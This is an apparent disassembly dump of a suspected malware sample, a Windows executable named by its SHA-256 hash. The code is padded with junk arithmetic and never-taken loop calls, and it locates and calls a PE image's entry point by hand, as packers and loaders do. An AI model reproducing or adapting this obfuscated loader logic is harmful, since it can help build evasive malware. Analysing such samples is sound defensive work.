
238a7646dc5f5b7bc32b37bec4ed506a181b7af874f0624b9a2b09b50cb527af.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x14c
  401009:	push   ebx
  40100a:	add    DWORD PTR ds:0x413d18,edx
  401010:	push   esi
  401011:	adc    eax,DWORD PTR ds:0x41400c
  401017:	push   edi
  401018:	adc    DWORD PTR ds:0x413c74,ecx
  40101e:	xor    esi,esi
  401020:	sbb    eax,DWORD PTR ds:0x413bfe
  401026:	mov    DWORD PTR [ebp-0x10],esi
  401029:	adc    edi,eax
  40102b:	mov    eax,DWORD PTR [ebp-0x20]
  40102e:	and    DWORD PTR ds:0x413c06,0x0
  401038:	jmp    0x40104a
  40103d:	mov    edi,DWORD PTR ds:0x413c06
  401043:	inc    edi
  401044:	mov    DWORD PTR ds:0x413c06,edi
  40104a:	cmp    DWORD PTR ds:0x413c06,0x12
  401051:	jae    0x40107f
  401057:	cmp    DWORD PTR ds:0x413c06,0x18
  40105e:	jne    0x401074
  401064:	push   0x413c74
  401069:	push   0x1062
  40106e:	call   DWORD PTR ds:0x41675c
  401074:	jmp    0x40103d
  401079:	xor    DWORD PTR ds:0x413bf6,ebx
  40107f:	push   0x5
  401081:	mov    DWORD PTR [ebp-0x20],eax
  401084:	pop    edi
  401085:	push   0x4164c8
  40108a:	call   DWORD PTR ds:0x416794
  401090:	push   esi
  401091:	and    DWORD PTR ds:0x413c70,0x414018
  40109b:	push   0x69
  40109d:	push   0xe
  40109f:	push   0x6
  4010a1:	push   0x4
  4010a3:	xor    DWORD PTR ds:0x41401c,0x413c16
  4010ad:	push   0x87698897
  4010b2:	sbb    DWORD PTR ds:0x41401c,0x413c16
  4010bc:	call   DWORD PTR ds:0x416750
  4010c2:	push   esi
  4010c3:	add    DWORD PTR ds:0x413d2c,0x792b
  4010cd:	push   0x3
  4010cf:	push   0x2
  4010d1:	push   0x4
  4010d3:	sbb    DWORD PTR ds:0x414008,0x413c0e
  4010dd:	push   0x2
  4010df:	push   0x56778769
  4010e4:	push   0x76867576
  4010e9:	inc    DWORD PTR ds:0x413c74
  4010ef:	call   DWORD PTR ds:0x41674c
  4010f5:	add    DWORD PTR ds:0x413c6c,0x413d20
  4010ff:	dec    edi
  401100:	mov    DWORD PTR ds:0x413bf6,0x25f1
  40110a:	jne    0x401085
  401110:	push   0x4164f0
  401115:	sbb    DWORD PTR ds:0x414000,0x413c0e
  40111f:	push   esi
  401120:	push   esi
  401121:	and    DWORD PTR ds:0x413c78,0x5ead
  40112b:	call   DWORD PTR ds:0x416788
  401131:	test   eax,eax
  401133:	je     0x40114f
  401139:	mov    eax,ds:0x75687681
  40113e:	adc    ebx,DWORD PTR ds:0x413c0a
  401144:	imul   eax,eax,0x5463da1d
  40114a:	mov    ds:0x75687681,eax
  40114f:	mov    eax,DWORD PTR [ebp-0x20]
  401152:	mov    DWORD PTR ds:0x41401c,0x2026
  40115c:	mov    ebx,0xf89c85b0
  401161:	mov    DWORD PTR ds:0x413c78,0x6385
  40116b:	cmp    eax,ebx
  40116d:	jne    0x4011cf
  401173:	add    DWORD PTR ds:0x414004,0x37c8
  40117d:	mov    DWORD PTR ds:0x4164c4,0xf89c85b1
  401187:	push   DWORD PTR [ebp+0x10]
  40118a:	sub    DWORD PTR ds:0x413bfe,0x414004
  401194:	push   DWORD PTR [ebp+0xc]
  401197:	and    DWORD PTR ds:0x413c1a,0x413ce4
  4011a1:	push   DWORD PTR [ebp+0x8]
  4011a4:	xor    DWORD PTR ds:0x413d34,0x413d2c
  4011ae:	call   0x402685
  4011b3:	mov    ecx,DWORD PTR ds:0x4163b4
  4011b9:	mov    esi,DWORD PTR ds:0x413c1e
  4011bf:	or     DWORD PTR ds:0x413c06,esi
  4011c5:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4011cb:	xor    esi,esi
  4011cd:	mov    DWORD PTR [ecx],eax
  4011cf:	mov    DWORD PTR [ebp-0x8],ebx
  4011d2:	sub    ecx,DWORD PTR ds:0x413d20
  4011d8:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  4011df:	lea    eax,[ebp-0x60]
  4011e2:	xor    esi,DWORD PTR ds:0x413d18
  4011e8:	mov    DWORD PTR [ebp-0x48],eax
  4011eb:	lea    eax,[ebp-0x54]
  4011ee:	mov    DWORD PTR [ebp-0x1c],eax
  4011f1:	add    DWORD PTR ds:0x413c16,0x903
  4011fb:	mov    eax,ds:0x4163b4
  401200:	mov    eax,DWORD PTR [eax+0x1c8]
  401206:	adc    DWORD PTR ds:0x413cf4,edi
  40120c:	mov    eax,DWORD PTR [eax]
  40120e:	mov    esi,DWORD PTR ds:0x413ce4
  401214:	add    esi,DWORD PTR ds:0x413c16
  40121a:	mov    DWORD PTR ds:0x413ce4,esi
  401220:	mov    ecx,DWORD PTR [ebp-0x1c]
  401223:	xor    edi,edi
  401225:	mov    esi,0x7510894
  40122a:	xor    eax,esi
  40122c:	mov    edi,0x3272dc
  401231:	adc    DWORD PTR ds:0x413c78,0x59b2
  40123b:	add    eax,edi
  40123d:	mov    DWORD PTR ds:0x413d24,0x7b51
  401247:	mov    DWORD PTR [ecx],eax
  401249:	mov    eax,ds:0x4165e0
  40124e:	mov    DWORD PTR ds:0x413c80,0x7e03
  401258:	cmp    eax,0x312bc9f6
  40125d:	mov    DWORD PTR ds:0x413d24,0x296e
  401267:	jne    0x401312
  40126d:	mov    eax,DWORD PTR [ebp-0x8]
  401270:	mov    ecx,DWORD PTR ds:0x4163b4
  401276:	mov    ecx,DWORD PTR [ecx+0x198]
  40127c:	xor    eax,esi
  40127e:	add    eax,edi
  401280:	mov    edx,DWORD PTR ds:0x413c6c
  401286:	xor    DWORD PTR ds:0x414010,edx
  40128c:	mov    DWORD PTR [ecx],eax
  40128e:	movzx  ecx,BYTE PTR ds:0x413c6c
  401295:	and    ecx,DWORD PTR ds:0x413d2c
  40129b:	mov    DWORD PTR ds:0x413c6c,ecx
  4012a1:	mov    eax,DWORD PTR [ebp-0x8]
  4012a4:	mov    DWORD PTR ds:0x413cd8,0x1b
  4012ae:	cmp    DWORD PTR ds:0x413cd8,0x0
  4012b5:	je     0x401303
  4012bb:	cmp    DWORD PTR ds:0x413cd8,0x1c
  4012c2:	jne    0x4012dd
  4012c8:	push   0x104b
  4012cd:	push   0x413d18
  4012d2:	push   0x2575
  4012d7:	call   DWORD PTR ds:0x416760
  4012dd:	xor    edx,edx
  4012df:	xor    edx,DWORD PTR ds:0x413cd8
  4012e5:	dec    edx
  4012e6:	mov    DWORD PTR ds:0x413cd8,edx
  4012ec:	jmp    0x4012ae
  4012f1:	mov    edx,DWORD PTR ds:0x413ce8
  4012f7:	or     edx,DWORD PTR ds:0x413c7c
  4012fd:	mov    DWORD PTR ds:0x413ce8,edx
  401303:	xor    eax,esi
  401305:	add    eax,edi
  401307:	or     ecx,DWORD PTR ds:0x413d24
  40130d:	mov    ds:0x4165e0,eax
  401312:	mov    eax,ds:0x4163b4
  401317:	mov    eax,DWORD PTR [eax+0x18c]
  40131d:	and    DWORD PTR ds:0x413c1a,0x0
  401327:	jmp    0x401339
  40132c:	mov    ecx,DWORD PTR ds:0x413c1a
  401332:	inc    ecx
  401333:	mov    DWORD PTR ds:0x413c1a,ecx
  401339:	cmp    DWORD PTR ds:0x413c1a,0x15
  401340:	jae    0x40136e
  401346:	cmp    DWORD PTR ds:0x413c1a,0x20
  40134d:	jne    0x401369
  401353:	push   0x6f97
  401358:	push   DWORD PTR [ebp-0x18]
  40135b:	push   0x2919
  401360:	push   DWORD PTR [ebp-0x14]
  401363:	call   DWORD PTR ds:0x416764
  401369:	jmp    0x40132c
  40136e:	mov    eax,DWORD PTR [eax]
  401370:	xor    edx,edx
  401372:	or     edx,DWORD PTR ds:0x413c0e
  401378:	adc    DWORD PTR ds:0x413cdc,edx
  40137e:	mov    DWORD PTR [ebp-0xa4],eax
  401384:	xor    eax,eax
  401386:	xor    eax,DWORD PTR ds:0x413cd0
  40138c:	mov    eax,DWORD PTR [eax]
  40138e:	sbb    DWORD PTR ds:0x413d34,eax
  401394:	mov    eax,0xf89c85bc
  401399:	xor    edx,ecx
  40139b:	mov    DWORD PTR [ebp-0x10],eax
  40139e:	mov    DWORD PTR [ebp-0x10],eax
  4013a1:	mov    DWORD PTR [ebp-0x10],eax
  4013a4:	sub    ecx,ecx
  4013a6:	mov    DWORD PTR [ebp-0x1c],ebx
  4013a9:	or     DWORD PTR ds:0x413c80,0x7e3b
  4013b3:	mov    DWORD PTR [ebp-0x10],eax
  4013b6:	mov    DWORD PTR [ebp-0x10],0xf89c85b8
  4013bd:	add    DWORD PTR ds:0x413d34,edi
  4013c3:	mov    ecx,DWORD PTR [ebp-0x8]
  4013c6:	xor    ecx,esi
  4013c8:	add    ecx,edi
  4013ca:	mov    DWORD PTR [ebp-0x18],ecx
  4013cd:	add    DWORD PTR ds:0x414018,edi
  4013d3:	mov    ecx,DWORD PTR [ebp-0xc]
  4013d6:	and    DWORD PTR ds:0x413c7c,0xe1
  4013e0:	mov    edx,DWORD PTR [ebp-0xc]
  4013e3:	adc    DWORD PTR ds:0x413d28,0x413d20
  4013ed:	xor    edx,esi
  4013ef:	xor    ecx,esi
  4013f1:	sbb    DWORD PTR ds:0x414014,0x47d8
  4013fb:	add    ecx,edx
  4013fd:	movzx  edx,BYTE PTR ds:0x41400c
  401404:	and    DWORD PTR ds:0x413bf6,edx
  40140a:	mov    edx,DWORD PTR [ebp-0xc]
  40140d:	xor    edx,esi
  40140f:	lea    ecx,[ecx+edx*1+0x975894]
  401416:	cmp    DWORD PTR [ebp-0x18],ecx
  401419:	ja     0x4015f5
  40141f:	or     eax,DWORD PTR ds:0x413bfa
  401425:	mov    eax,DWORD PTR [ebp-0xc]
  401428:	mov    ecx,DWORD PTR ds:0x413c80
  40142e:	xor    DWORD PTR ds:0x413ce8,ecx
  401434:	mov    ecx,DWORD PTR [ebp-0x18]
  401437:	sbb    DWORD PTR ds:0x413d20,0x413d34
  401441:	xor    eax,esi
  401443:	and    DWORD PTR ds:0x413cdc,0x413d24
  40144d:	lea    eax,[eax+ecx*1+0x3272dc]
  401454:	sub    DWORD PTR ds:0x414008,0x413cd8
  40145e:	push   eax
  40145f:	sbb    DWORD PTR ds:0x413c0a,edi
  401465:	mov    eax,DWORD PTR [ebp-0x1c]
  401468:	xor    DWORD PTR ds:0x413c80,0x7b1e
  401472:	xor    eax,esi
  401474:	lea    eax,[ebp+eax*1+0x3272e4]
  40147b:	or     DWORD PTR ds:0x413c16,0x7d42
  401485:	push   eax
  401486:	mov    DWORD PTR ds:0x414018,0x19
  401490:	cmp    DWORD PTR ds:0x414018,0x0
  401497:	je     0x4014cb
  40149d:	cmp    DWORD PTR ds:0x414018,0x28
  4014a4:	jne    0x4014bb
  4014aa:	push   DWORD PTR [ebp-0x14]
  4014ad:	push   DWORD PTR [ebp-0x18]
  4014b0:	push   0x400000
  4014b5:	call   DWORD PTR ds:0x416768
  4014bb:	mov    eax,ds:0x414018
  4014c0:	dec    eax
  4014c1:	mov    ds:0x414018,eax
  4014c6:	jmp    0x401490
  4014cb:	mov    eax,ds:0x4163b4
  4014d0:	and    DWORD PTR ds:0x413c6c,0x2ac9
  4014da:	push   DWORD PTR [eax+0x1bc]
  4014e0:	call   0x40a25b
  4014e5:	mov    eax,DWORD PTR [ebp-0xc]
  4014e8:	sbb    edx,edx
  4014ea:	mov    ecx,DWORD PTR [ebp-0x18]
  4014ed:	and    DWORD PTR ds:0x413d24,0x0
  4014f7:	mov    edx,DWORD PTR ds:0x413d24
  4014fd:	inc    edx
  4014fe:	mov    DWORD PTR ds:0x413d24,edx
  401504:	cmp    DWORD PTR ds:0x413d24,0x1c
  40150b:	jne    0x401525
  401511:	push   DWORD PTR [ebp-0x14]
  401514:	push   0x413d30
  401519:	push   DWORD PTR [ebp-0x1c]
  40151c:	push   DWORD PTR [ebp-0x24]
  40151f:	call   DWORD PTR ds:0x416770
  401525:	cmp    DWORD PTR ds:0x413d24,0x1b
  40152c:	jb     0x4014f7
  401532:	xor    eax,esi
  401534:	lea    eax,[ecx+eax*1+0x3272dc]
  40153b:	mov    ecx,DWORD PTR [ebp-0xc]
  40153e:	mov    edx,DWORD PTR [ebp-0xc]
  401541:	dec    DWORD PTR ds:0x413bf6
  401547:	xor    edx,esi
  401549:	xor    ecx,esi
  40154b:	sbb    DWORD PTR ds:0x413c1e,0x34e4
  401555:	add    ecx,edx
  401557:	and    DWORD PTR ds:0x413c02,0x0
  401561:	jmp    0x401573
  401566:	mov    edx,DWORD PTR ds:0x413c02
  40156c:	inc    edx
  40156d:	mov    DWORD PTR ds:0x413c02,edx
  401573:	cmp    DWORD PTR ds:0x413c02,0x1b
  40157a:	jae    0x4015bf
  401580:	cmp    DWORD PTR ds:0x413c02,0x1e
  401587:	jne    0x4015a7
  40158d:	push   0x413d28
  401592:	push   0x3ad3
  401597:	push   0x416152
  40159c:	push   0x416152
  4015a1:	call   DWORD PTR ds:0x416774
  4015a7:	jmp    0x401566
  4015ac:	movzx  edx,BYTE PTR ds:0x413ce8
  4015b3:	sub    edx,DWORD PTR ds:0x413c1a
  4015b9:	mov    DWORD PTR ds:0x413ce8,edx
  4015bf:	mov    edx,DWORD PTR [ebp-0xc]
  4015c2:	xor    DWORD PTR ds:0x413c80,0x413c74
  4015cc:	xor    edx,esi
  4015ce:	lea    ecx,[ecx+edx*1+0x975894]
  4015d5:	mov    DWORD PTR [ebp-0x18],eax
  4015d8:	cmp    eax,ecx
  4015da:	mov    DWORD PTR ds:0x413c7c,0x908
  4015e4:	jbe    0x40141f
  4015ea:	add    DWORD PTR ds:0x413cf4,ecx
  4015f0:	mov    eax,0xf89c85bc
  4015f5:	add    DWORD PTR ds:0x414014,ecx
  4015fb:	mov    ecx,DWORD PTR [ebp+0xc]
  4015fe:	mov    DWORD PTR ds:0x416238,ecx
  401604:	mov    ecx,DWORD PTR [ebp+0x10]
  401607:	and    DWORD PTR ds:0x413c1a,0x0
  401611:	mov    edx,DWORD PTR ds:0x413c1a
  401617:	inc    edx
  401618:	mov    DWORD PTR ds:0x413c1a,edx
  40161e:	cmp    DWORD PTR ds:0x413c1a,0x25
  401625:	jne    0x40163e
  40162b:	push   DWORD PTR [ebp-0x1c]
  40162e:	push   0x414004
  401633:	push   0x416170
  401638:	call   DWORD PTR ds:0x416778
  40163e:	cmp    DWORD PTR ds:0x413c1a,0x19
  401645:	jb     0x401611
  40164b:	mov    DWORD PTR ds:0x41648c,ecx
  401651:	adc    DWORD PTR ds:0x413c1e,ebx
  401657:	mov    ecx,DWORD PTR ds:0x416238
  40165d:	mov    edx,DWORD PTR ds:0x414014
  401663:	xor    DWORD PTR ds:0x413c0e,edx
  401669:	mov    edx,DWORD PTR [ebp-0x48]
  40166c:	sub    ecx,edi
  40166e:	and    DWORD PTR ds:0x413cf0,0x24ff
  401678:	xor    ecx,esi
  40167a:	mov    DWORD PTR [edx],ecx
  40167c:	not    ecx
  40167e:	mov    ecx,DWORD PTR [ebp-0x20]
  401681:	mov    DWORD PTR ds:0x413c16,0x6aa9
  40168b:	cmp    ecx,ebx
  40168d:	mov    DWORD PTR ds:0x413c70,0x4e28
  401697:	jne    0x401b90
  40169d:	add    DWORD PTR ds:0x413d18,0x41400c
  4016a7:	lea    eax,[ebp-0x5c]
  4016aa:	and    DWORD PTR ds:0x413c16,0x3f2d
  4016b4:	mov    DWORD PTR [ebp-0xb0],eax
  4016ba:	lea    eax,[ebp+0x4]
  4016bd:	add    DWORD PTR ds:0x413cec,0x413d24
  4016c7:	mov    DWORD PTR [ebp-0x5c],eax
  4016ca:	mov    eax,DWORD PTR [ebp-0x5c]
  4016cd:	xor    DWORD PTR ds:0x413ce4,0x37e4
  4016d7:	test   eax,eax
  4016d9:	mov    DWORD PTR ds:0x413c7c,0x3884
  4016e3:	je     0x402663
  4016e9:	adc    DWORD PTR ds:0x413c12,ebx
  4016ef:	mov    eax,DWORD PTR [ebp-0x24]
  4016f2:	mov    eax,DWORD PTR [ebp-0xc]
  4016f5:	mov    eax,DWORD PTR [ebp-0x8]
  4016f8:	sub    ecx,0x1090
  4016fe:	mov    DWORD PTR [ebp+0xc],eax
  401701:	mov    eax,eax
  401703:	mov    eax,ds:0x4163b4
  401708:	and    DWORD PTR ds:0x413bfa,0x0
  401712:	jmp    0x401724
  401717:	mov    ecx,DWORD PTR ds:0x413bfa
  40171d:	inc    ecx
  40171e:	mov    DWORD PTR ds:0x413bfa,ecx
  401724:	cmp    DWORD PTR ds:0x413bfa,0x11
  40172b:	jae    0x401754
  401731:	cmp    DWORD PTR ds:0x413bfa,0x20
  401738:	jne    0x401749
  40173e:	push   0x4160de
  401743:	call   DWORD PTR ds:0x41677c
  401749:	jmp    0x401717
  40174e:	and    DWORD PTR ds:0x413c74,ecx
  401754:	mov    eax,DWORD PTR [eax+0x1c8]
  40175a:	and    DWORD PTR ds:0x414010,0x0
  401764:	mov    ecx,DWORD PTR ds:0x414010
  40176a:	inc    ecx
  40176b:	mov    DWORD PTR ds:0x414010,ecx
  401771:	cmp    DWORD PTR ds:0x414010,0xf
  401778:	jne    0x401791
  40177e:	push   0x413c0a
  401783:	push   DWORD PTR [ebp-0x20]
  401786:	push   0x4160b3
  40178b:	call   DWORD PTR ds:0x416780
  401791:	cmp    DWORD PTR ds:0x414010,0xe
  401798:	jne    0x4017ab
  40179e:	mov    ecx,DWORD PTR ds:0x414010
  4017a4:	inc    ecx
  4017a5:	mov    DWORD PTR ds:0x414010,ecx
  4017ab:	cmp    DWORD PTR ds:0x414010,0x1c
  4017b2:	jb     0x401764
  4017b8:	mov    DWORD PTR ds:0x413bf6,0x13
  4017c2:	cmp    DWORD PTR ds:0x413bf6,0x0
  4017c9:	je     0x401820
  4017cf:	cmp    DWORD PTR ds:0x413bf6,0x6
  4017d6:	jne    0x4017ec
  4017dc:	push   0x414018
  4017e1:	push   0x1023
  4017e6:	call   DWORD PTR ds:0x416784
  4017ec:	cmp    DWORD PTR ds:0x413bf6,0x7
  4017f3:	jne    0x401808
  4017f9:	xor    ecx,ecx
  4017fb:	add    ecx,DWORD PTR ds:0x413bf6
  401801:	dec    ecx
  401802:	mov    DWORD PTR ds:0x413bf6,ecx
  401808:	mov    ecx,DWORD PTR ds:0x413bf6
  40180e:	dec    ecx
  40180f:	mov    DWORD PTR ds:0x413bf6,ecx
  401815:	jmp    0x4017c2
  40181a:	adc    DWORD PTR ds:0x413ce8,ebx
  401820:	mov    eax,DWORD PTR [eax]
  401822:	and    DWORD PTR ds:0x414010,0x0
  40182c:	jmp    0x401840
  401831:	xor    ecx,ecx
  401833:	add    ecx,DWORD PTR ds:0x414010
  401839:	inc    ecx
  40183a:	mov    DWORD PTR ds:0x414010,ecx
  401840:	cmp    DWORD PTR ds:0x414010,0x19
  401847:	jae    0x401873
  40184d:	cmp    DWORD PTR ds:0x414010,0x27
  401854:	jne    0x401868
  40185a:	push   DWORD PTR [ebp-0x18]
  40185d:	push   0x4160de
  401862:	call   DWORD PTR ds:0x41678c
  401868:	jmp    0x401831
  40186d:	sub    DWORD PTR ds:0x413c0a,edi
  401873:	cdq    
  401874:	mov    ebx,eax
  401876:	mov    eax,0xfabdbeef
  40187b:	mov    ecx,DWORD PTR ds:0x413c1e
  401881:	or     DWORD PTR ds:0x413d1c,ecx
  401887:	add    ebx,eax
  401889:	mov    ecx,0x6f0c
  40188e:	adc    edx,0xffffffff
  401891:	and    DWORD PTR [ebp-0x10],0x0
  401895:	sub    DWORD PTR ds:0x413c6c,0x6250
  40189f:	xor    edx,0x0
  4018a2:	xor    DWORD PTR ds:0x413c84,ecx
  4018a8:	mov    DWORD PTR [ebp-0x80],edx
  4018ab:	mov    edx,DWORD PTR [ebp+0xc]
  4018ae:	mov    DWORD PTR ds:0x413c74,0x12
  4018b8:	cmp    DWORD PTR ds:0x413c74,0x0
  4018bf:	je     0x401906
  4018c5:	cmp    DWORD PTR ds:0x413c74,0x1e
  4018cc:	jne    0x4018f2
  4018d2:	push   DWORD PTR [ebp-0x24]
  4018d5:	push   0x413cd8
  4018da:	push   0x560c
  4018df:	push   0x416049
  4018e4:	push   DWORD PTR [ebp-0x18]
  4018e7:	push   0x1b95
  4018ec:	call   DWORD PTR ds:0x416790
  4018f2:	mov    ecx,DWORD PTR ds:0x413c74
  4018f8:	dec    ecx
  4018f9:	mov    DWORD PTR ds:0x413c74,ecx
  4018ff:	jmp    0x4018b8
  401904:	not    ecx
  401906:	mov    DWORD PTR [ebp-0x14],edx
  401909:	and    DWORD PTR ds:0x413c06,0x0
  401913:	jmp    0x401925
  401918:	mov    edx,DWORD PTR ds:0x413c06
  40191e:	inc    edx
  40191f:	mov    DWORD PTR ds:0x413c06,edx
  401925:	cmp    DWORD PTR ds:0x413c06,0x14
  40192c:	jae    0x401967
  401932:	cmp    DWORD PTR ds:0x413c06,0x5
  401939:	jne    0x401948
  40193f:	push   DWORD PTR [ebp-0xc]
  401942:	call   DWORD PTR ds:0x416798
  401948:	cmp    DWORD PTR ds:0x413c06,0x4
  40194f:	jne    0x401962
  401955:	mov    edx,DWORD PTR ds:0x413c06
  40195b:	inc    edx
  40195c:	mov    DWORD PTR ds:0x413c06,edx
  401962:	jmp    0x401918
  401967:	mov    ecx,0x8a29a125
  40196c:	xor    ebx,ecx
  40196e:	neg    DWORD PTR ds:0x413d18
  401974:	add    DWORD PTR [ebp-0x14],eax
  401977:	mov    DWORD PTR ds:0x414010,ebx
  40197d:	mov    edx,DWORD PTR [ebp-0x14]
  401980:	mov    DWORD PTR ds:0x41401c,0x7ba5
  40198a:	adc    DWORD PTR [ebp-0x10],0xffffffff
  40198e:	xor    edx,ecx
  401990:	add    DWORD PTR ds:0x414010,0x307
  40199a:	mov    DWORD PTR [ebp-0x78],edx
  40199d:	mov    edx,DWORD PTR [ebp-0x10]
  4019a0:	xor    edx,0x0
  4019a3:	mov    DWORD PTR ds:0x414018,0x4b60
  4019ad:	mov    DWORD PTR [ebp-0x74],edx
  4019b0:	cmp    DWORD PTR [ebp-0x78],ebx
  4019b3:	mov    DWORD PTR ds:0x413c02,0x936
  4019bd:	jne    0x4019df
  4019c3:	mov    DWORD PTR ds:0x413c0a,edx
  4019c9:	mov    edx,DWORD PTR [ebp-0x80]
  4019cc:	cmp    DWORD PTR [ebp-0x74],edx
  4019cf:	mov    DWORD PTR ds:0x413c7c,0x301a
  4019d9:	je     0x401aa0
  4019df:	and    DWORD PTR ds:0x413d34,0x0
  4019e9:	jmp    0x4019fb
  4019ee:	mov    edx,DWORD PTR ds:0x413d34
  4019f4:	inc    edx
  4019f5:	mov    DWORD PTR ds:0x413d34,edx
  4019fb:	cmp    DWORD PTR ds:0x413d34,0x16
  401a02:	jae    0x401a25
  401a08:	cmp    DWORD PTR ds:0x413d34,0x26
  401a0f:	jne    0x401a20
  401a15:	push   0x414014
  401a1a:	call   DWORD PTR ds:0x41679c
  401a20:	jmp    0x4019ee
  401a25:	mov    edx,DWORD PTR ds:0x4163b4
  401a2b:	neg    DWORD PTR ds:0x414008
  401a31:	mov    edx,DWORD PTR [edx+0x1c0]
  401a37:	mov    DWORD PTR ds:0x413bf6,0x5ff4
  401a41:	mov    edx,DWORD PTR [edx]
  401a43:	and    DWORD PTR ds:0x413ce0,0x41400c
  401a4d:	xor    ebx,ebx
  401a4f:	add    edx,eax
  401a51:	mov    DWORD PTR ds:0x413c78,0x3f53
  401a5b:	adc    ebx,0xffffffff
  401a5e:	and    DWORD PTR ds:0x413c02,0x1b79
  401a68:	xor    edx,ecx
  401a6a:	add    DWORD PTR ds:0x413ce0,0x413c6c
  401a74:	xor    ebx,0x0
  401a77:	mov    DWORD PTR ds:0x413bfa,0x4fab
  401a81:	cmp    edx,0x70941fd5
  401a87:	mov    DWORD PTR ds:0x413d2c,0x7f9c
  401a91:	jne    0x402663
  401a97:	cmp    ebx,0xffffffff
  401a9a:	jne    0x402663
  401aa0:	mov    edx,DWORD PTR ds:0x416430
  401aa6:	add    DWORD PTR ds:0x413cdc,0x3946
  401ab0:	mov    ebx,DWORD PTR ds:0x416438
  401ab6:	and    DWORD PTR ds:0x413c80,0x3ee6
  401ac0:	xor    edx,ebx
  401ac2:	mov    DWORD PTR ds:0x414000,0x16
  401acc:	cmp    DWORD PTR ds:0x414000,0x0
  401ad3:	je     0x401b12
  401ad9:	cmp    DWORD PTR ds:0x414000,0x26
  401ae0:	jne    0x401af6
  401ae6:	push   0x413c84
  401aeb:	push   0x56a1
  401af0:	call   DWORD PTR ds:0x41675c
  401af6:	mov    ebx,DWORD PTR ds:0x414000
  401afc:	dec    ebx
  401afd:	mov    DWORD PTR ds:0x414000,ebx
  401b03:	jmp    0x401acc
  401b08:	add    DWORD PTR ds:0x413c84,0x1062
  401b12:	mov    DWORD PTR ds:0x416430,edx
  401b18:	mov    ebx,DWORD PTR ds:0x416430
  401b1e:	and    DWORD PTR ds:0x413d20,0x0
  401b28:	jmp    0x401b3a
  401b2d:	mov    edx,DWORD PTR ds:0x413d20
  401b33:	inc    edx
  401b34:	mov    DWORD PTR ds:0x413d20,edx
  401b3a:	cmp    DWORD PTR ds:0x413d20,0x1a
  401b41:	jae    0x401b72
  401b47:	cmp    DWORD PTR ds:0x413d20,0x25
  401b4e:	jne    0x401b67
  401b54:	push   DWORD PTR [ebp-0x24]
  401b57:	push   0x413d1c
  401b5c:	push   0x7dc0
  401b61:	call   DWORD PTR ds:0x416760
  401b67:	jmp    0x401b2d
  401b6c:	adc    DWORD PTR ds:0x413bfe,edi
  401b72:	mov    edx,DWORD PTR [ebp-0x5c]
  401b75:	xor    DWORD PTR ds:0x413c7c,0x413c1e
  401b7f:	add    DWORD PTR [edx],ebx
  401b81:	mov    DWORD PTR ds:0x414010,0x3837
  401b8b:	jmp    0x402624
  401b90:	mov    DWORD PTR ds:0x41401c,0x671d
  401b9a:	mov    ecx,DWORD PTR [ebp-0x60]
  401b9d:	mov    DWORD PTR ds:0x413c02,0x3bc3
  401ba7:	cmp    ecx,0xf89c85b1
  401bad:	je     0x401d26
  401bb3:	mov    ecx,DWORD PTR [ebp-0x8]
  401bb6:	mov    edx,DWORD PTR [ebp-0x54]
  401bb9:	or     DWORD PTR ds:0x413c1a,0x413cdc
  401bc3:	xor    ecx,esi
  401bc5:	add    ecx,edi
  401bc7:	cmp    ecx,edx
  401bc9:	je     0x401d26
  401bcf:	mov    DWORD PTR ds:0x413d28,0x18
  401bd9:	cmp    DWORD PTR ds:0x413d28,0x0
  401be0:	je     0x401c32
  401be6:	cmp    DWORD PTR ds:0x413d28,0xa
  401bed:	jne    0x401c07
  401bf3:	push   0x7420
  401bf8:	push   DWORD PTR [ebp-0xc]
  401bfb:	push   DWORD PTR [ebp-0x20]
  401bfe:	push   DWORD PTR [ebp-0x14]
  401c01:	call   DWORD PTR ds:0x416764
  401c07:	cmp    DWORD PTR ds:0x413d28,0xb
  401c0e:	jne    0x401c1f
  401c14:	mov    eax,ds:0x413d28
  401c19:	dec    eax
  401c1a:	mov    ds:0x413d28,eax
  401c1f:	xor    eax,eax
  401c21:	add    eax,DWORD PTR ds:0x413d28
  401c27:	dec    eax
  401c28:	mov    ds:0x413d28,eax
  401c2d:	jmp    0x401bd9
  401c32:	mov    eax,ds:0x4163b4
  401c37:	mov    DWORD PTR ds:0x413c88,0x7ef
  401c41:	mov    eax,DWORD PTR [eax+0x194]
  401c47:	mov    ecx,DWORD PTR [eax]
  401c49:	mov    eax,DWORD PTR [ecx+0x3c]
  401c4c:	adc    DWORD PTR ds:0x413c74,0x414014
  401c56:	push   DWORD PTR ds:0x41648c
  401c5c:	add    DWORD PTR ds:0x413c1e,0x413d24
  401c66:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  401c6a:	push   DWORD PTR ds:0x416238
  401c70:	add    DWORD PTR ds:0x414000,0x414014
  401c7a:	add    eax,ecx
  401c7c:	mov    DWORD PTR ds:0x413d1c,0x15
  401c86:	cmp    DWORD PTR ds:0x413d1c,0x0
  401c8d:	je     0x401ce5
  401c93:	cmp    DWORD PTR ds:0x413d1c,0x3
  401c9a:	jne    0x401cb1
  401ca0:	push   0x8408
  401ca5:	push   DWORD PTR [ebp-0x24]
  401ca8:	push   DWORD PTR [ebp-0x1c]
  401cab:	call   DWORD PTR ds:0x416768
  401cb1:	cmp    DWORD PTR ds:0x413d1c,0x4
  401cb8:	jne    0x401ccb
  401cbe:	mov    ecx,DWORD PTR ds:0x413d1c
  401cc4:	dec    ecx
  401cc5:	mov    DWORD PTR ds:0x413d1c,ecx
  401ccb:	xor    ecx,ecx
  401ccd:	or     ecx,DWORD PTR ds:0x413d1c
  401cd3:	dec    ecx
  401cd4:	mov    DWORD PTR ds:0x413d1c,ecx
  401cda:	jmp    0x401c86
  401cdf:	add    DWORD PTR ds:0x413bfa,ecx
  401ce5:	mov    ecx,DWORD PTR ds:0x4163b4
  401ceb:	mov    ecx,DWORD PTR [ecx+0x194]
  401cf1:	or     DWORD PTR ds:0x414000,0x5329
  401cfb:	push   DWORD PTR [ecx]
  401cfd:	call   eax
  401cff:	mov    ecx,DWORD PTR ds:0x4163b4
  401d05:	mov    ecx,DWORD PTR [ecx+0x1cc]
  401d0b:	mov    DWORD PTR ds:0x413c78,0x5666
  401d15:	mov    DWORD PTR [ecx],eax
  401d17:	mov    DWORD PTR ds:0x413d24,0x5c21
  401d21:	jmp    0x402663
  401d26:	adc    edx,DWORD PTR ds:0x413cf0
  401d2c:	mov    ecx,DWORD PTR [ebp-0x8]
  401d2f:	sub    edx,DWORD PTR ds:0x413c70
  401d35:	mov    edx,DWORD PTR [ebp-0xa4]
